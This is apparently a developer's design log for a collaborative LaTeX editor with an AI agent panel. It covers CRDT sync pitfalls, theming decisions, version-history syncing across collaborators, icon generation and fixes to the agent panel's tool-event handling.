Written down because none of them is discoverable from the outside, and four
of the five fail silently.

**`doc["text"]` returns `None`** for a root type that arrived through
`apply_update` rather than through assignment -- so a document read back from
disk looks empty to anything that indexes it, with no error anywhere.
`doc.get(name, type=T)` answers correctly, and `_root` in `store.py` exists
for this alone.

**An observer runs inside the transaction that fired it**, and pycrdt refuses
a nested one. So nothing in an observer may read the document: persistence is
handed the update bytes rather than deriving them, compaction waits for a
path with no transaction open, and scheduling a write never writes. The error
when this is got wrong -- "Already mutably borrowed" -- names neither the
observer nor the read.

**A joiner asked for no files.** The first version of `send_documents`
offered the documents this install had *open*, and a joiner has none open, so
it received an empty project while the handshake, the membership and the
connection all looked perfectly healthy.

**A collaborator who closed their window stayed for thirty seconds**, caret
and all. y-protocols drops a silent peer after `outdatedTimeout`, which is a
module constant and cannot be lowered. The first design relayed awareness
unread, on the principle that the server should not re-implement somebody
else's wire format; that principle survives, but the conclusion did not,
because pycrdt already implements it. The server keeps an `Awareness` of its
own and says who has gone the moment their socket closes.

**Starlette's HTTP middleware does not run for the websocket scope.** The
check that guards the other ninety routes does not guard the sync route, and
a version of it that forgot would hand every document in every open project
to anyone who could reach the port while looking, on screen, exactly like a
version that did not. `authorise_socket` is called in the handler body and
there is a test whose only job is to notice if it stops being.

### The bundle

`bundle.initial_kb` was 770.3 before any of this and is 773.1 after it,
against a budget of 775 -- which is not free, and is not the whole cost
either. Yjs, `y-protocols` and `y-codemirror.next` are a 102 kB chunk that
`bench.py` does not count, because it counts the entry script and this is
imported when a file is opened. The honest number is that a first
*interaction* got about fifty kilobytes heavier and the first *paint* got
three heavier, and the second is the one the budget is about.

### What is deliberately not solved

Two agents editing the same paragraph at once converge syntactically and not
semantically: the text will be valid LaTeX and may not be sensible prose.

`git pull` replaces a whole file, so it wins against a collaborator's
untouched paragraphs in the same file. Committing and pushing are safe; the
documentation says to pull between sessions rather than during one.

Retention is per peer. Two collaborators may hold different depths of the
same file's history, because thinning is a decision about a local disk. It
syncs by a mark that only moves forward, a set difference would re-offer
every record that thinning had just dropped, for ever, and §26 says what
that mark is now, which is not what it was when this was written.

Relaying inherits that. Where a third install receives somebody's history
through a peer rather than from them directly, it receives the depth that
peer kept, not the depth the author kept. It is the same answer one hop out,
and it is why a collaborator's version can be listed on one machine and not
on another without either of them being wrong.

And a collaborator who never reconnects takes their intermediate states with
them. A projection made from somebody else's typing no longer records a
version of its own, see §26, so the states between their last sync and
their disappearance exist only on their machine. The window is the sync
latency, which is seconds.

And removing a collaborator disconnects them without retracting anything.
There is no owner, so there is no authority that could rotate a key, and a
button that looked like revocation and was not would be worse than no button.
The sentence saying so is next to the button and not in a footnote.

## 23. A page you can choose, and furniture you cannot

Two axes were added to the theming in one pass, and the second one found
bugs in the first that no amount of looking would have.

### The light theme was a cloud

Four surfaces five L\* apart, all of them light, with the frame only five
points below the panes. The result was one grey field divided by hairlines:
the rail, the editor, the agent column and the surround read as the same
object, and the typeset page, which §1 says is the point of the whole
palette, was no brighter than the panes beside it. The writer's own words
for it were that it looked "completely light everywhere, like a cloud", and
that there should be contrast between the panes and the things in front of
them.

The answer is *furniture*. The rail, the agent column, the status strip, the
diagnostics drawer, the folded rail's spine and every floating card take the
**dark** palette while the theme is light. The editor and the preview stay
light, so the light theme is now a lit editor and a lit page set into dark
furniture.

The mechanism is one selector added to the dark block:

```css
:root[data-theme="dark"],
:root[data-theme="light"] .nx-furniture,
.nx-theme-dark { ... }
```

and nothing else. This works because `@theme inline` keeps the `var()`
indirection inside every compiled Tailwind utility, `bg-surface` in the
bundle is `background-color: var(--surface)`, so a container that
redeclares the palette repaints everything inside it with no component
changes at all.

**Why not a third palette, or a layer of `--chrome-*` tokens.** Both were
considered and both are worse for the same reason. A third palette is three
dozen values that have to be authored, measured, and then kept in step; §2
records twice what happens when two copies of a palette are free to drift.
A `--chrome-*` layer doubles the token count, gives every component a second
vocabulary to choose between, and creates a whole matrix of pairs, `--pen`
on `--chrome-2`, `--error` on `--chrome`, that `contrast.test.ts` has no
curated entries for. Reusing the dark palette creates **zero** new pairs:
every pair already certified for dark holds verbatim.

The new selector goes *before* `.nx-theme-dark`, because `contrast.test.ts`
finds the block by searching for the literal string `.nx-theme-dark {`, and
a selector appended after that one would take the brace with it.

### Three papers for the editor page

`editorTheme` was `match | light | dark`, and "light" meant the proofing
grey. That is the right ground for judging a page and the wrong one for
somebody who has composed on white for twenty years. There are now six
grounds: `match`, `light` (the proofing grey), `white`, `warm`, `cool` and
`dark`. `white` is exactly `#FFFFFF`, because that was the request, and a
near-white pretending to be white is worse than either.

They are **not** three more palettes. Each is applied together with
`.nx-theme-light`, which supplies the inks, the five accents and the five
syntax hues, and moves only the four surfaces upward. That is what makes the
syntax highlighting come with them instead of having to be redrawn, and it
is why `contrast.test.ts` composes them (`{...LIGHT, ...paper}`) rather than
measuring four hexes in isolation.

Two tokens move with the surfaces, and both move opposite to the obvious
direction.

**`--ink-3` gets louder on a brighter page, not fainter.** It measures
6.2:1 on the proofing grey and 7.9:1 on white. Left alone, a comment would
have outranked the prose it annotates, so the papers lift it back to roughly
the weight it was chosen for. This is the only ink they touch: `--ink` and
`--ink-2` merely gain contrast, which is never a fault.

**`--line` is the one thing that genuinely weakens**, and not because of the
ink. It is `color-mix(in oklab, var(--ink-3) 55%, transparent)`: an alpha
mix, so what shows is 55% of the ink over 45% of the ground. Brighten the
ground *and* lighten the ink and the hairline moves two steps toward the
page, taking the gutter rule and the search panel's borders with it. The
papers mix it at 68% to stand still.

### The three bugs the furniture found

**`--on-pen`.** A filled `--pen` button decided its label colour with
`:root[data-theme="dark"] .pen-button { color: var(--surround) }`, it asked
the *root* what theme it was. That is the wrong question inside a subtree,
and it was already latently wrong for a `.nx-theme-dark` editor. The moment
the agent column became furniture it went actively wrong: Send in the light
theme would have been white on `#C988E7` at 2.6:1, in the one control the
agent's entire colour reservation exists for. It is a token now, written as
a literal hex in every palette so the contrast test's regex captures it, and
the selector is gone. This is the `--on-accent` idea from NexusQC, and it
earned its place here for exactly the reason it earned it there.

**Colour inherits as a value, not as the variable.** The project name, the
agent column's heading and several buttons went invisible the instant the
furniture arrived. `color` inherits *resolved*: `body` computes its colour
from the light `--ink` once, and every descendant inherits that dark grey
even inside a subtree that has since redeclared `--ink` for a dark ground.
One line, `.nx-furniture { color: var(--ink) }`, retires the whole class
of it. Anything else handed a palette by a class needs the same line.

**`theme-color` was the wrong token.** The meta tag declared `#121614`, the
dark theme's `--surface`, in both themes. The browser paints its own chrome
with it, so it should be the app's outermost ground and it should follow the
theme. The pre-paint script sets it now.

### The editor ground is offered as a colour

The Settings card used a `Choice` row of words, and words were the problem:
"Light" in that row and "Light" in the Theme row directly above it meant two
different things, which is why every button in a `Choice` carries its group's
name in its accessibility label. Six grounds could not have survived that.

They are swatches, and each is painted by putting the app's own palette class
on the fill and filling with `var(--surface)`. There is no list of preview
hexes here to go stale, the swatch *is* the token. `Match` is drawn as both
palettes at once, split down the middle, because that is what it means, and
a caption names the current choice so the row reads as a sentence rather than
as six grey rectangles to guess between.

## 24. Clearing a file's history, and one registry for what a file is

### Clearing

`DELETE /api/projects/{id}/history?path=` throws away every stored version of
one file. It is the only destructive operation in the history store, so what
it must *not* do is the whole design.

Blobs are content-addressed and therefore shared: with the file's own past,
with any other file that happens to hold identical bytes, and with the final
version recorded for something now sitting in the trash. Nothing in the route
unlinks a blob by name. It drops one log with `History.forget`, then lets
`History.collect` sweep whatever no *remaining* log points at. The
collector's one-hour grace exists to stop it racing a `record` that has
written a blob and not yet its line, so a version made in the last hour
survives the call and goes on the next one, which is why the interface says
disk comes back "within the hour" and must not promise sooner.

The order is forget, re-seed, collect. Collecting first would unlink the blob
holding the file's current contents and the re-seed would immediately write
it back: harmless, but it makes the reported figure a lie.

The re-seed is a floor. Without it the file has no past at all, the panel is
empty, and the next edit has nothing to diff against. It is recorded as
`create`, which is in `PERMANENT_OPS` and therefore never thinned.

**The working file is untouched**, by construction: `forget` only removes
`log/<slug>.jsonl` and the `paths.json` entry, and nothing else in the route
opens the file except to read it for the marker. The confirmation says so
before it says anything else, because "delete version history" beside a file
reads a great deal like "delete the file".

**A peer's copy is not purged, and nothing is sent to say it was.** What a
collaborator keeps of this file is on their disk, and §22 already treats two
collaborators holding different depths of one file's history as correct
rather than as a fault. One person's decision about their own disk space
must not reach into somebody else's copy; the confirmation says as much, on
a shared project only, for the same reason the sentence about removing a
collaborator sits beside that button rather than in the documentation.

What keeps it cleared is a **floor**, left behind in `paths.json` by
`History.forget` and enforced by `History.absorb`, which refuses any arriving
record at or below it. Per author, not one number for the file: a single
floor taken across everybody is whatever the furthest-ahead clock in the
project says, and a collaborator with an accurate clock would then have
their next records dropped on arrival until real time caught up with a
stranger's machine. Per author, the comparison only ever puts one machine's
clock against its own. The boundary is fuzzy by the skew between the two,
which is the accepted cost.

The paragraph that stood here recorded a known gap: that sync cursors were
indices into a peer's own contribution list, so a purge left the list at
length one while a collaborator's cursor sat at N. That was true, and it was
narrower than the truth. §26 replaces it.

### One registry for what a file is

There were four answers to "what kind of thing is this file", and they
disagreed. `project.py` has `TEXT_SUFFIXES` and `IMAGE_SUFFIXES`; the
frontend had a `RENDERABLE` set that excluded `.pdf`; `History.tsx` had a
*second* `TEXT_SUFFIXES` including `.bbl`, `.csv`, `.log`, `.py` and `.sh`
where the server's did not; and the file tree asked about `.bib` and `.tex`
with regular expressions written inline.

The visible consequence: a PDF figure was called an image by the server, so
the editor was skipped; refused by the renderer, because `RENDERABLE`
excluded it; and offered as a download in an application that had PDF.js
loaded one column away. Writers keep figures as PDF precisely so they scale,
so the one file this app could not show was the one it was best equipped to.

`frontend/src/panes/file-kinds.ts` is now the single answer, and it has **no
imports and may never gain one**: `History.tsx` imports it statically, and a
static import anywhere keeps the module in the entry chunk, which is what
stopped `FileView` being split out of it before.

The server's sets are deliberately not merged into it. Those decide what the
editor may open, which is a question about bytes on disk and has to be
answered on the server whatever the browser believes; this one decides how to
draw a row and which viewer to reach for. A vitest asserts the containment
that has to hold, every suffix the server will hand over as text is text
here too, so the two can differ without drifting.

### The viewers

`FileView`'s docstring used to say it was "deliberately not a viewer: no
zoom, no pan, no page controls". That call is reversed rather than left to
contradict the code. A figure is not an attachment; it is the object the
writer is judging, and judging it means seeing it at a size they choose.

PDFs go to the preview pane's own viewer, which now takes an optional
`source` URL instead of the build output: the same rasteriser, the same
zoom ladder, the same page controls. Double-click inverse search is inert
when `source` is set: there is no source file behind somebody's figure, and
asking synctex anyway would land the caret on an unrelated line of the main
document.

Images get zoom, fit and their real pixel dimensions, and they are drawn **on
paper**, with the page's own shadow, on the surround. The old viewer centred
them on `--surface-2`, so a plot exported with a transparent background,
which is most of them: was judged against near-black in the dark theme,
where a white axis label simply is not there. Paper is also the honest
preview: white is what transparent will be once it is on the page.

## 25. The mark, and the screens with no document on them

Both of these were added to the run by the writer partway through, and both
turned out to be the same observation from two directions: the design stops
at the edge of the editor.

### The screens outside the editor

The project list, the sign-in screen, the reconnect screen and the error
boundary are chrome from edge to edge. There is no page being written on any
of them and nothing on them is a document, so they take `.nx-furniture`
whole rather than in parts. Leaving them out made the project list the one
pale field in a light theme that had gone dark everywhere else: you set up
a project in a dark interface, pressed Back, and the room changed colour.

The project list needed more than a palette, though. It was a masthead, a
form and a status line centred in an empty field, with nothing under any of
them: at 1000px tall, three hundred pixels of nothing above the first word.
Every other surface in this application is drawn as an object lying on the
proofing grey, the typeset page, the panes, the cards, the figures, and
this screen was the one place that idea had been dropped. It is a sheet now.
The project list inside it steps down to `--surface-2` rather than carrying
a border of its own, because a card inside a card is two objects claiming to
be one.

### The mark

Redrawn, and the reasoning is in `frontend/src/Logo.tsx` at length because a
mark is the one thing in a codebase nobody can reconstruct from the code.
The short version is three failures that only show up beside the rest of the
interface.

It was in a rounded square. That is the most generic container in software,
it said nothing the sheet inside it was not already saying, and it cost the
glyph half its height in a 20px slot.

Its chevron read as damage. A notch cut into a page's edge is a torn page
before it is an arrow, and it sat on the *left* edge, where a control
meaning "back" would be. It was carrying the wrong half of the name at the
cost of the silhouette.

And it was a sheet with a folded corner, which is to say it was almost
exactly the glyph this same pass drew beside every file in the tree. A logo
that is also the file icon has stopped being a logo. Nothing in it said
typesetting, and nothing in it said TeX.

It is now a page with a backslash struck across it. Every command in the
language this application exists to write begins with one; it is a single
stroke, so it survives 16px; and no other product's mark is a backslash.

**The page is drawn in `--ink` and only the backslash is `--pen`.** That is
the part to keep if it is ever redrawn again. Violet in this application
means the agent touched something, and a mark washed in it spends a colour
the interface has reserved: one stroke of it is a signature, a whole glyph
of it is a claim. It also means the mark takes the theme's own inks and is
legible on both grounds without a second set of values, which a single fixed
brand violet would not be: `#7B45A0` on the dark rail measures 2.8:1, under
the 3:1 a graphic needs. NexusQC's rule that a logo should not follow a
preference is right for a dark-only app and wrong here.

The favicon lives in `index.html`, because a tab icon has to be right before
any script runs. There used to be a `FAVICON_SVG` export beside the component
with no consumer anywhere: a second copy of the mark, free to drift from the
first, and already differing from it.

**It was a different drawing on purpose, and that was wrong.** The argument
was that at 16px the page outline closes up into a grey box with something in
it, so the small cut kept only the stroke and put it *on* a violet tile
rather than in it, because a tab has no ground of its own to sit on. The
second half of that is right and the first half was never measured. The page
outline is 1.9 units against a 32 unit box, which is a hair under a whole
pixel at 16px, and it antialiases to a legible hairline rather than closing
up. What the argument bought was a mark with no page in it at all, on the one
surface where most people see the application's name.

So there is one mark now, in one geometry, and two renderings of it. Where
the application's own stylesheet is present it is drawn live and transparent
and takes the theme's inks, which is `Logo.tsx` unchanged. Where the ground
belongs to somebody else, a tab strip, a desktop, a taskbar, GitHub in either
of its themes, the same geometry sits on `--surround` with the dark theme's
ink and pen, at nine tenths the size so the tile has a margin the live mark
does not need. One number is a hair off that scaling: the backslash is 2.7
where 2.88 would be exact, because a light stroke on a dark ground blooms and
at the exact weight the page became a frame around a violet bar.

`scripts/make-icons.py` draws all of it from one set of numbers, and writes
the tab icon, the desktop icon, the Windows shortcut icon and the mark the
README shows. That is the same `FAVICON_SVG` problem solved the other way:
rather than forbidding a second copy, the copies are generated, so a change
to the mark reaches every surface or reaches none.

**Two of those surfaces had never had a mark at all.** `desktop_entry` writes
an `Icon=` line only if the file it names is there, and `desktop-shortcut.ps1`
sets `IconLocation` only under the same condition. Both name something under
`frontend/public`, and `frontend/public` did not exist. So every Linux desktop
entry NextTex has ever written went out with no icon line, and every Windows
shortcut has shown Python's own icon, on the one file a person double-clicks
to start the application. The guard is right, because an `Icon=` pointing at
nothing shows as a broken image rather than as no image; what was missing was
anything that noticed the guard was always false. The test for it uses the
real checkout rather than a root built under `tmp_path`, which is why the
tests that were already there could not have caught it.

macOS gets no icon and that is not a fourth thing to fix. Its shortcut is a
`.command` file, and Finder takes the icon for one from the file type.

## 26. What a history is when there are two of you

The writer asked for the version history to be audited against
collaboration, and gave licence to revert earlier decisions where a more
robust answer needed it. Three audits went through the stores, the whole of
`server/collab/`, and every test and document that pins them. What came back
was not one clash but a family of them, and two were worse than the one that
prompted the phase.

This section is what the answer is. Two principles hold it up, and the
second one is the one that was missing.

**How deep a past you keep is a decision about your own disk.** Retention is
local, so two collaborators holding different depths of one file's history is
correct rather than a fault. That was already the position and it has not
changed. What changed is everything that was built on top of it.

**Who wrote a version is a fact about the version, not about the machine it
is sitting on.** This was not true, and until it was, "this install's own
records" named no particular set, which is the ground the first principle
needs in order to mean anything.

### Every install used to record the others' typing as its own

`CollabStore._write` projects the merged document to disk and then records a
version, and `record_version` stamps whoever owns the machine doing the
writing. So when Alice typed, Bob's install wrote the merged text to Bob's
disk and recorded a version stamped **Bob**, then offered Alice's paragraph
back to Alice as Bob's work. Nothing deduplicated it, because both the moment
and the author differed, so a shared file's log grew by roughly one wrongly
attributed entry per edit per collaborator. Whether it happened at all
depended on a race between a peer's lines arriving and the 120 ms projection
timer, so the duplication was not even consistent.

It also meant `by="claude"` did not travel. The agent's edit is never thinned
on the machine the agent ran on, and was an ordinary thinnable edit
everywhere else, so two collaborators disagreed about which versions were
safe.

**A projection whose pending changes all came from somebody else writes no
history line.** The person who typed it records it; everybody else receives
that record through history sync, which is what history sync is for. The
contents are still stored on the way past, because it is the same sha the
author's own line will name, so their version opens here with no round trip
and the orphans go to the collector like any other.

The flag that decides this lives on the store rather than on the
transaction, because pycrdt's event carries no origin. It is read and
cleared at the top of `_write`, not later: the projection runs on a timer,
and a keystroke landing while it works must not be filed as a
collaborator's.

### The mark is a moment, not a position

A peer asked "what have you recorded after position N in your list", and the
list is one `_thin` takes entries out of, from the middle, on every save.

Running off the end stopped that file's history for good. Thinning from the
*middle* was quieter and worse: later records slid down into ground the peer
had already passed and were skipped in silence, while the records on either
side of them arrived normally, so nothing looked wrong from either machine.
Coalescing did it a third way: `record` replaces the last line, so the peer
kept a burst's intermediate save whose contents the author's next sweep
collects, and was never sent the finished one.

It asks "what have you recorded **after this moment**" now, and each install
keeps a mark per author per file saying where that moment is. A mark only
moves forward, so a record thinning has dropped is never asked for again;
and unlike a position, no amount of local thinning can change what a moment
refers to.

For that question to have an answer, an author's moments have to be
distinct. `record` forces `at` strictly above the newest record **by the same
author** in that file: by a whole millisecond, because absorbing rounds to
the millisecond when it asks whether it already holds a record. Scoped to the
author on purpose: taken over every record, a collaborator whose clock runs
ten hours fast would drag this machine's timestamps ten hours forward and
they would stay there.

### Per author, which buys relaying

Collaborators in different time zones are rarely at their desks at the same
moment. A mark kept per *link* cannot express what a third machine holds, so
two people who each only ever meet a third never exchange a single version,
however long the project runs. A record's author travels with the record, so
passing on somebody else's is exact: provided a relayed line keeps its own
author and is not stamped with the relay's id, which is the one mistake that
would key the whole scheme on the wrong peer.

Two rules keep relaying from becoming the retention argument this design
exists to avoid. **Nobody offers a peer that peer's own records**, checked by
the sender so that a marks file that was lost or never written cannot defeat
it. And **`History.absorb` refuses any line claiming to be authored here**,
which is the same rule from the other end, and is also what stops a member
signing their work with somebody else's name, inflating what every other
machine thinks that person has written.

### It syncs while the connection is up

History was asked for once, when a link opened, and never again. So two
people working together for a week watched each other type continuously and
saw one another's versions only when somebody's laptop closed. It compounded
with the mark: the longer a connection lived the more thinning had run, so
the reconnect that finally exchanged history was the one most likely to find
the mark past the end of the list.

A `HIST_NEW` frame says a file has a past it did not have a moment ago,
debounced, because an editing burst is already one version. It hangs off the
history itself rather than off `record_version`, for two reasons: the trash
records straight onto the history and would otherwise never say a word, and
a relaying install has to speak up when it *absorbs* somebody's lines as much
as when it writes its own.

The ask also came out of the loop's `kind != "text"` guard, so a figure's
past travels now. That was invisible until §24 gave figures a viewer, version
viewing and a clear-history button, all of which assume it does.

### A version that cannot be opened says so

A collaborator's version arrives as a line and its contents come when
somebody asks for them, which is the right trade: almost nobody opens almost
any old version, and a peer's whole past would otherwise be a download before
the first keystroke. But if its author has since thinned that record away and
swept the contents, the line stays and clicking it will always fail.

So the last day of a collaborator's versions, and anything anybody named, is
fetched as the line arrives: across every link rather than the one that sent
it, because a relay can pass on a record for content it does not itself hold.
The rest keeps the on-demand fetch, and the panel marks them *elsewhere*: no
thumbnail is requested for one, and opening it gives a sentence rather than a
restore that cannot work.

### One writer at a time

There was no lock of any kind in `nexttex/history.py`, and every change there
rewrites the whole log. `record` reads the list, appends and writes it back;
so does a peer's lines arriving; and both run off the event loop. The second
writer had read the same list as the first and its write simply erased the
first one's version.

Measured rather than argued: sixteen threads writing twenty versions each to
one file kept **7 of 320** without the lock, and 320 with it.

`versions()` also sorts after parsing now. Everything downstream reads a log
as a sequence, `record` takes the last entry as the previous version,
thinning keeps the last of each bucket, a collaborator asks for everything
after a moment, and a rename onto a name that already had a past used to
append one log's text onto the other's and leave the result out of order on
disk. Sorting on read repairs a log already in that state.

### Deleting, trashing, and coming back

*Clearing a file's history* is the only destructive thing the store does, and
§24 covers it. What is new here is that it leaves a **floor** behind, per
author, so a collaborator still holding those records cannot hand them back.
Nothing is gossiped: a purge is a decision about one disk.

*A rename* is one field in the manifest changing, which is what keeps
everybody's editor pointed at the same document. What it never did was move
the file on the other machine, so that machine kept the old name with the old
contents, the new name appeared only when somebody happened to type into that
document, and then it had both: with the history still filed under the old
name, because nothing in the collaboration layer ever called `note_move`. It
follows both now, on the projection's own timer rather than inside the
manifest transaction, which may not touch a disk.

*A deletion* had the mirror of that. The record is flagged, projection stops
writing the file, and the file sat there: in the tree, written by nothing,
with no trash entry and therefore no way for the person at that machine to
put it back. Opening it in another editor made the watcher ingest a path
whose record is trashed, and `file_id_for` skips trashed records, so that
machine ended up holding two documents for one path. A deletion now goes into
the receiving machine's own trash, which is what gives that person a restore.

*A restore whose old name has been taken* comes back beside it, and its past
comes with it. Not by renaming the log: history is keyed by path, so the log
at the old name holds the restored file's past **and** the past of whatever
took the name after it went, which is exactly why `Trash._forget` checks
whether anything lives there before forgetting. Renaming would hand one
file's history to another. It is cut at the last deletion instead, which is
always there to cut at because a deletion is never thinned away.

The collaborative half of that was worse. `untrash` was told only the name
the file came back under, which matched no trashed record at all, so a fresh
id was minted after all: the original document stayed trashed for ever with a
collaborator's offline edits sealed inside it, and that peer went on holding
a stale file it could no longer write to. It is told both names now.

### Two smaller things that were promises rather than facts

Neither the history nor the trash called `write_atomically`, though the trash
imported it. Every write was a temp file and a rename with nothing flushed,
which is exactly what that function exists to prevent: the rename lands, the
bytes do not, and the file comes back the right length and full of zeroes.
Worse, `put` short-circuits on a name that already exists, so one such blob
made that version unopenable for good with no way back. Reading a blob that
will not decompress now drops it, so the next save of that content writes it
properly.

And a shared project never swept its own history. Collection ran when a
session was evicted, and a shared project is deliberately never evicted, so
unless the writer emptied the trash or cleared a file by hand it kept every
thinned version's contents for ever: the exact failure eviction-time
collection was added to fix, reintroduced by the rule that keeps shared
projects alive. An open project is swept hourly now.

### Deliberately not done

**Project-level shared retention.** A convergence protocol, thinning
tombstones, an agreed depth: all rejected. It is a large amount of new shared
state to fix what was a ten-line bug, and more shared state is less robust,
not more.

**Delivering a binary file's bytes to a joiner.** A joiner gets a manifest
entry for `figures/plot.png` and no file. That is real, and it is a
file-sync gap rather than a history one; syncing a figure's *past* is done.

**Rekeying history on the collaboration file id** rather than on the path
slug. Three keyspaces meeting, the path slug, the file id, the trash entry
id, is the root cause behind two of the findings above. Following the
manifest's path on the receiving side is the minimal correct fix; rekeying is
a migration deserving its own run.

**The reaper's window.** It takes a session out of the table and then awaits
its close, so a request landing in that window builds a second history on the
same directory while the first is still writing to it. Closing that properly
needs `session_for` to be able to wait, and it is called synchronously from
most of the routes in `server/main.py`.

### One thing the audit got wrong, recorded because it was believed

`BlobStore.collect` was reported as returning after its first shard, which
would have meant collection swept a two-hundred-and-fifty-sixth of the store.
It does not; the `return` is after the loop. The report's rendering of the
indentation was misleading. It is written down here because it was nearly
acted on, and a fix to code that is already right is how a real bug gets
introduced.

## 27. A figure the agent could not look at

The agent wrote a script that drew a figure, ran it, and then read the PNG
back to see whether the panels were right. That read killed the session.
The reader raised `CLIJSONDecodeError`, the turn stopped mid-sentence, and
every question typed afterwards came back in under two milliseconds saying
the connection to the model had ended. Only a new conversation worked, and
a new conversation loses the thread that made the figure worth checking.

Two separate faults, and the second one is the expensive one.

**The wire carries an image twice.** The SDK frames the CLI's stdout as
newline-delimited JSON and refuses any single line over a megabyte, which
sounds generous until an image is involved. Base64 adds a third. The
`PostToolUse` hook adds the rest: with a hook registered, the CLI sends the
result out once as a control request so the hook can see it, and again in
the user message. A 290 KB figure measured 576 KB in the control request
and 1,151,564 bytes in the user message. Without the hook the same read
produces an 851 KB line and squeaks under the limit, which is why this is a
failure shaped like NextTex rather than one everybody hits.

The ceiling is now sixty-four megabytes. Not "enough for that figure":
enough for any image the model will accept. Nothing is preallocated, so a
ceiling that high only costs memory when a line really is that long, and
being exact instead of generous only buys another incident.

The same reader taught a second lesson on the way past. A call is recorded
when its `PreToolUse` hook fires and forgotten when `PostToolUse` fires, so
a turn that dies between the two leaves a call that is running for ever.
Nothing noticed, because the table is only read by the watchdog that ends
silent turns, and it reads it on the *next* turn: a phantom `Read` would
hold a stuck turn open, and then, minutes later, end a healthy one by
reporting that a tool nobody had called was still going. No turn begins
with a call already running, so a turn now begins by emptying it.

**A dead client is still an object.** When the reader died, the client
stayed in `self._client`, connected to a subprocess whose reader task was
gone. It answered `receive_response` the way a closed stream does, by
ending at once, so the turn fell straight through to the path that reports
a stream with no result. That path was working exactly as written. What
nobody had considered is that it would be reached again on the next
question, and the one after, for ever.

So both endings now drop the client: the one that raises and the one that
quietly stops. The next question builds another, and because the session id
is on disk the new client resumes the same conversation, which is the point.
The drop names the client it is dropping, so a rebuild that has already
happened elsewhere is not undone by a late arrival.

There is a shape here worth keeping. A failure that loses one answer is an
incident; a failure that poisons the cache is an outage. Anything held
between turns has to be asked, when a turn ends badly, whether it is still
worth holding.

---

## 28. Rebuilding the agent panel

The panel had an end-to-end spec and a fence with six hundred lines of tests, and it had never been audited as a whole the way the palette, the installer and the collaboration layer had. Three things about it were unpleasant enough to be worth a run of their own: hundreds of permission cards in a row, each one disabling the composer until it was answered; a panel that went quiet while a turn worked, because nothing told it a tool call had ended; and an agent that could delegate to a subagent whose work nobody could see. The four capabilities added alongside are in the sections below.

This section is written as the run goes rather than at the end, and every deviation from the specification above is recorded here with its reason, per this document's own preamble.

### The panel had no way to know a call had finished

Nothing emitted anything when a tool call came back. `PostToolUse` recorded an edit and returned; a call that read a file, or ran a build, or searched the literature produced one event on the way in and none on the way out. So the activity line in the header had to guess, and it guessed by walking the whole transcript backwards on every render, taking the last thing it recognised as the thing happening now. That is twenty walks a second while an answer streams, and worse than the cost is that the answer was wrong in the one case that mattered: a turn that spent twenty seconds inside a single tool showed the same line for twenty seconds and read as a turn that had stopped.

There is a `tool_done` event now, carrying the call's id, its name, how long it took and whether it worked, and `activity` is a slice of state set from the events rather than derived from the rendered items. The name travels as well as the id, because the id in the hook comes from the CLI and the id on the row comes from the assistant message: those are believed to be the same string and it cannot be proved from the SDK's source, so the store matches on the id and falls back to the name. A mismatch then costs a duration on one row rather than an activity line that never clears, which is the thing the event exists to fix.

**A tool that failed never reported at all, and that was a second bug underneath the first.** `PostToolUseFailure` is a separate hook event and this app registered only `PostToolUse`, so a call that failed left its entry in the running-call table for ever. The watchdog reads that table: a turn holding a phantom running call waits against the one hour tool timeout rather than the fifteen minute silence timeout, so a turn that genuinely died after a failed tool sat there for an hour before anything ended it. Both hooks are registered now, one handler reads `hook_event_name` to tell them apart, and a failed write drops the undo snapshot the fence took on the way in rather than leaving a file's whole text in memory.

Durations show on a tool row only past half a second. A duration on every row is a column of `0.0s` down the transcript, and half a second is where a reader starts to care; what it buys is that the tool rows stop being a list of verbs and become a record of where a turn went. Collapsed rows sum rather than keeping the first one's number, because fourteen reads folded into one row should say what the fourteen cost.

### An elapsed count, which is not the spinner section 6 forbids

Section 6 says no spinners anywhere, and section 7 gives the argument: an indicator shown at 0 ms on a fast task is what converts an imperceptible wait into a watched one, which is why the compile hairline waits 400 ms before it appears. Both hold. What the panel needed was not a spinner but an answer to *is this still going*, for a turn that can legitimately spend a minute in one call.

So the activity line carries an integer of seconds, in tabular figures with a reserved width, and it appears only once the current activity has passed three seconds. Three seconds is the same argument as the hairline's 400 ms applied to a tool call rather than to a build. It does not animate, it does not move, and nothing periodic goes on the wire for it: one timestamp arrives with the event and the subtraction happens in the browser. The 1400 ms breathing dot that was already there stays, and is still the only repeating animation in the panel.

### The agent's own plan for the turn was being thrown away

`TodoWrite` was in the panel's hidden-tools set, described as plumbing rather than work. It is not plumbing. It is the model stating what it intends to do and ticking items off as it goes, it already arrived on the wire on every turn that used it, and the panel discarded it. This was the cheapest thing in the whole run: the data was already there and nothing new had to be emitted.

It is drawn as the turn's plan, pinned in the stream and replaced in place as later calls revise it, so a turn that rewrites its list four times shows one list rather than four rows. Rows rather than a card, and the stripe vocabulary is the one the panel already uses: `--ok` for what is done, `--pen` for the item in hand, `--line` for what is still to come. No checkbox glyphs, because a checkbox invites a click that would do nothing.

It is deliberately not in the transcript. The transcript is the account of what was done to the manuscript and a rehearsal is not, and looking at it made that concrete: recording the call meant a reload replayed the plan as a tool row named `TodoWrite`, so the one readable thing about a long turn came back as protocol noise. It is not recorded at all now. It survives until the next question rather than vanishing on `done`, which is deliberate: a finished plan with every item struck through says what the turn set out to do and that it got there, and clearing it the instant the answer lands would make the panel flicker at the end of every turn. `ToolSearch` stays hidden, because that genuinely is plumbing.

### Thinking is shown as a fact and never as prose

`ThinkingBlock` was imported and never handled, which looked like an oversight and was two: the `thinking` option on the SDK's own options object was never set either, so it was possible no thinking block had ever arrived.

**That option is still not set, and the reason is the model list.** Its own documentation says `{"type": "adaptive"}` is the default for models that support it and names Opus 4.6 and later, and this app offers Haiku 4.5 in its picker. Setting it unconditionally would be choosing, on the writer's behalf, a configuration one of the three offered models predates, in exchange for nothing: leaving it unset already gets adaptive thinking on the models that have it. So the blocks are handled and the option is left alone, and that is a decision rather than an omission.

Where the events come from matters more than it sounds. The start edge is taken from the stream, a `content_block_start` naming a thinking block or the first `thinking_delta`, and the completed `ThinkingBlock` is only the stop edge. A panel keyed on the completed block would light up at the one moment there was nothing left to wait for, because with partial messages on that block arrives when the reasoning is already over. One event per stretch of reasoning rather than one per delta: the panel says the same thing either way, and a per-delta event is traffic bought for nothing.

What the panel shows is that the model is reasoning, not what the reasoning says. The panel is 380 px wide and sits beside a manuscript; a column of reasoning would bury the answer and the edits under text nobody reads twice, and several agent panels that do stream it are the reason this is worth stating as a decision rather than leaving as an omission.

### Delegation is refused, and the question the architecture recorded is settled

